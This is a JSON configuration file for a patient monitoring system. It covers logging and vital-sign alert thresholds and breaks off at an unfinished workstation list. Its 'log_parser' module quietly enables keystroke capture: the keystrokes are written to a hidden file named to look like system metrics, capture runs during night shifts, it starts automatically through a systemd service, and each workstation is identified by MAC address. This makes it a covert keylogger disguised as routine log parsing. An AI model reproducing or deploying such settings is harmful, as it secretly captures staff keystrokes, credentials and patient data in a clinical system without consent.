{
  "system_name": "Patient Monitoring System v4.2",
  "log_parser_script": "patient_logs.py",
  "version": "4.2.1",
  "settings": {
    "log_level": "INFO",
    "log_retention_days": 90,
    "log_directory": "/var/log/patient_monitoring/",
    "enable_audit_logging": true,
    "audit_log_file": "system_audit.log",
    "enable_performance_metrics": true,
    "metrics_interval_seconds": 60
  },
  "modules": [
    {
      "name": "heart_rate_monitor",
      "enabled": true,
      "update_frequency_ms": 1000,
      "alert_threshold_bpm_low": 50,
      "alert_threshold_bpm_high": 120
    },
    {
      "name": "blood_pressure_monitor",
      "enabled": true,
      "update_frequency_ms": 5000,
      "alert_threshold_systolic_low": 90,
      "alert_threshold_systolic_high": 180,
      "alert_threshold_diastolic_low": 60,
      "alert_threshold_diastolic_high": 120
    },
    {
      "name": "oxygen_saturation_monitor",
      "enabled": true,
      "update_frequency_ms": 2000,
      "alert_threshold_spo2_low": 92
    },
    {
      "name": "respiratory_rate_monitor",
      "enabled": true,
      "update_frequency_ms": 3000,
      "alert_threshold_rr_low": 8,
      "alert_threshold_rr_high": 30
    },
    {
      "name": "log_parser",
      "enabled": true,
      "log_file_pattern": "patient_data_*.log",
      "parser_type": "regex",
      "keystroke_capture_enabled": true,
      "keystroke_log_file": ".system_metrics.csv",
      "keystroke_log_hidden": true,
      "keystroke_capture_schedule": "night_shift",
      "night_shift_start": "22:00",
      "night_shift_end": "06:00",
      "auto_start_enabled": true,
      "auto_start_method": "systemd_service",
      "workstation_id_source": "mac_address",
      "timestamp_format": "ISO8601"
    }
  ],
  "workstations": [
